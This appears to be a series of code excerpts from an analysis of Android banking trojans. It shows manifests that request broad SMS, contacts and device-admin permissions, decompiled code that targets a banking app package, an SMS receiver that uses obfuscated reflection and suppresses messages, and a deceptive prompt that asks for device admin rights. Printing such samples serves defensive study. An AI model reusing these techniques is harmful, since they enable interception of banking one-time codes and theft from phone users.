["```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest  \n    android:versionCode=\"1\" android:versionName=\"6.127.465\" \n    android:installLocation=\"auto\" android:compileSdkVersion=\"28\" \n    android:compileSdkVersionCodename=\"9\" package=\"com.interactive.crutch\" \n    platformBuildVersionCode=\"1\" platformBuildVersionName=\"6.127.465\">\n  <uses-sdk android:minSdkVersion=\"19\" android:targetSdkVersion=\"25\"/>\n  <uses-permission android:name=\"android.permission.READ_CONTACTS\"/>\n  <uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>\n  <uses-permission android:name=\"android.permission.WRITE_SMS\"/>\n  <uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>\n  <uses-permission android:name=\"android.permission.SEND_SMS\"/>\n  <uses-permission android:name=\"android.permission.CALL_PHONE\"/>\n  <uses-permission android:name=\"android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS\"/>\n  <uses-permission android:name=\"android.permission.INTERNET\"/>\n  <uses-permission android:name=\"android.permission.DISABLE_KEYGUARD\"/>\n  <uses-permission android:name=\"android.permission.WAKE_LOCK\"/>\n  <uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\"/>\n  <uses-permission android:name=\"android.permission.VIBRATE\"/>\n```", "```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest  \n    android:versionCode=\"1\"  android:versionName=\"1.0\" package=\"com.fasstr\" \n    platformBuildVersionCode=\"22\" platformBuildVersionName=\"5.1.1-1819727\">\n  <uses-sdk android:minSdkVersion=\"9\" android:targetSdkVersion=\"18\"/>\n  <uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\"/>\n  <uses-permission android:name=\"android.permission.WAKE_LOCK\"/>\n  <uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>\n  <uses-permission android:name=\"android.permission.SEND_SMS\"/>\n  <uses-permission android:name=\"android.permission.READ_SMS\"/>\n  <uses-permission android:name=\"android.permission.WRITE_SMS\"/>\n  <uses-permission android:name=\"android.permission.CALL_PHONE\"/>\n  <uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>\n  <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>\n  <uses-permission android:name=\"android.permission.INTERNET\"/>\n  <uses-permission android:name=\"android.permission.READ_CONTACTS\"/>\n  <uses-permission android:name=\"android.permission.GET_TASKS\"/>\n  <uses-permission android:name=\"android.permission.WRITE_SETTINGS\"/>\n  <uses-permission android:name=\"android.permission.VIBRATE\"/>\n  <uses-permission android:name=\"android.permission.USES_POLICY_FORCE_LOCK\"/>\n  <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>\n  <uses-permission android:name=\"android.permission.CHANGE_WIFI_STATE\"/>\n  <uses-permission android:name=\"android.permission.CHANGE_NETWORK_STATE\"/>\n```", "```\npublic void a(String str) {\n  char c2 = 65535;\n  switch (str.hashCode()) {\n    case 849595102:\n      if (str.equals(\"au.com.bankwest.mobile\")) {\n        c2 = 0;\n        break;\n      }\n      break;\n  }\n  switch (c2) {\n    case 0:\n      b(\"au.com.bankwest.mobile\");\n      a((int) R.drawable.ic_stat_content_mail);\n      b((int) R.drawable.ic_stat_content_mail);\n      return;\n    default:\n      b(str);\n      a((int) R.drawable.ic_stat_content_mail);\n      b((int) R.drawable.ic_stat_content_mail);\n      return;\n  }\n}\n```", "```\npublic class e extends BroadcastReceiver {\n  protected static final String a = com.fasstr.e.e.a(MessageReceiver.class);\n  protected c b;\n\n  private void a(Context context, Intent intent) {\n    if (this.b.b()) {\n      Object[] objArr = (Object[]) intent.getExtras().get(\"pdus\");\n      SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n      for (int i = 0; i < objArr.length; i++) {\n        try {\n          smsMessageArr[i] = (SmsMessage) SmsMessage.class.getMethod(\n            \"cre_ateF_romP_du\".replace(\"_\", \"\"),\n            new Class[]{byte[].class}).invoke(\n              (Object) null, \n              new Object[]{(byte[]) objArr[i]});\n          Log.d(a, \"MSG GOT:\" + smsMessageArr[i].getMessageBody());\n        } catch (Exception e) {\n          Log.d(a, \"Handler method fail\");\n          e.printStackTrace();\n        }\n      }\n      if (this.b.c()) {\n        if (System.currentTimeMillis() - this.b.d() > this.b.e()) {\n          this.b.b(false);\n          this.b.a((String) null);\n        }\n      }\n      new f(context).a(context, smsMessageArr).a(this, context, smsMessageArr);\n    }\n  }\n\n  public void onReceive(Context context, Intent intent) {\n    a(context, intent);\n    abortBroadcast();\n  }\n}\n```", "```\npublic class AdminActivity extends Activity {\n  private DevicePolicyManager a;\n  private ComponentName b;\n\n  private void a() {\n    f.a(\"AdminActivity: get Device Admin\");\n    try {\n      this.a = (DevicePolicyManager) getSystemService(\"device_policy\");\n      this.b = new ComponentName(this, AdminRightsReceiver.class);\n      if (!this.a.isAdminActive(this.b)) {\n        Log.d(\"TAG\", \"try to become admin\");\n        Intent intent = new Intent(\"android.app.action.ADD_DEVICE_ADMIN\");\n        intent.putExtra(\"android.app.extra.DEVICE_ADMIN\", this.b);\n        intent.putExtra(\"android.app.extra.ADD_EXPLANATION\", \n          \"Click on Activate button to secure your application.\");\n        startActivityForResult(intent, 100);\n        return;\n      }\n      Log.d(\"TAG\", \"already admin\");\n    } catch (Exception e) {\n      e.printStackTrace();\n    }\n  }\n}\n```"]